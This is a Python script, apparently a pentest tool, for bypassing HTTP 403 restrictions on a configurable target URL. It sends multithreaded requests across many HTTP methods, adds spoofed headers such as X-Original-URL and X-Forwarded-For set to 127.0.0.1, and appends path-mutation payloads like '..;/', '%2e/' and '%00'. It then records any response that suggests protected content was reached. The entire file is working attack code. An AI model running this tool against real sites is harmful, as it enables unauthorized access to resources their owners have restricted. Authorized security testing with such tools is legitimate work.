import requests
import time
import threading
from queue import Queue

# === Configuration ===
url = "Replace_your_target_url"

# Optional: Set your proxy here (or None to disable)
proxies = None
# proxies = {
#     "http": "http://127.0.0.1:8080",
#     "https": "http://127.0.0.1:8080",
# }

# Optional: Basic Auth credentials (set to None if not used)
auth = None
# auth = ("username", "password")

headers = {
    "User-Agent": "Mozilla/5.0",
    "X-Original-URL": "/protected/resource",
    "X-Rewrite-URL": "/protected/resource",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Remote-Addr": "127.0.0.1",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1",
    "X-Forwarded-Server": "127.0.0.1",
}

methods = ["GET", "HEAD", "OPTIONS", "POST", "PUT", "DELETE", "TRACE", "PATCH"]

payloads = [
    url,
    url + "/",
    url + "/.",
    url + "%2e/",
    url + "?",
    url + "?test=1",
    url + ";",
    url + "..;/",
    url + "%20",
    url + "%09",
    url + "%00",
    url + "#",
    url + "#/",
    url + "?/",
    url + "??",
    url + "/*",
]

bypass_status_codes = [200, 201, 202, 203, 204, 205, 206, 301, 302, 307, 401]

results = []
lock = threading.Lock()
task_queue = Queue()

# ANSI color codes
COLOR_RESET = "\033[0m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_RED = "\033[91m"

def color_status_code(status):
    if 200 <= status < 300 or status in [301, 302, 307]:
        return f"{COLOR_GREEN}{status}{COLOR_RESET}"
    elif status == 401:
        return f"{COLOR_YELLOW}{status}{COLOR_RESET}"
    elif status in [403, 405]:
        return f"{COLOR_RED}{status}{COLOR_RESET}"
    else:
        return str(status)

def worker():
    while not task_queue.empty():
        method, payload = task_queue.get()
        try:
            print(f"\n[Trial] Method: {method} | URL: {payload}")
            response = requests.request(
                method,
                payload,
                headers=headers,
                allow_redirects=False,
                timeout=10,
                proxies=proxies,
                auth=auth
            )
            status = response.status_code
            colored_status = color_status_code(status)
            body_snippet = response.text[:200].replace('\n', ' ').replace('\r', ' ')
            print(f"[Response] Status Code: {colored_status}")
            print(f"[Response] Body Snippet: {body_snippet}")

            if status in bypass_status_codes:
                print(f"[Bypass Detected] Possible bypass with Method: {method} and URL: {payload}")
                print(f"[Headers] {response.headers}")
                with lock:
                    results.append({
                        "method": method,
                        "url": payload,
                        "status": status,
                        "headers": dict(response.headers),
                        "body_snippet": body_snippet
                    })
            else:
                print("[No Bypass] Access denied or method not allowed.")

            time.sleep(0.3)

        except requests.exceptions.RequestException as e:
            print(f"[Error] Exception occurred: {e}")
            time.sleep(1)
        finally:
            task_queue.task_done()

def save_results():
    if not results:
        print("\nNo bypasses detected.")
        return

    with open("403_bypass_results.txt", "w") as f:
        f.write("403 Bypass Test Results\n")
        f.write("=======================\n\n")
        for r in results:
            f.write(f"Method: {r['method']}\n")
            f.write(f"URL: {r['url']}\n")
            f.write(f"Status Code: {r['status']}\n")
            f.write(f"Headers: {r['headers']}\n")
            f.write(f"Body Snippet: {r['body_snippet']}\n")
            f.write("-" * 40 + "\n")
    print("\nResults saved to 403_bypass_results.txt")

if __name__ == "__main__":
    for method in methods:
        for payload in payloads:
            task_queue.put((method, payload))

    thread_count = 5
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    task_queue.join()
    for t in threads:
        t.join()

    save_results()
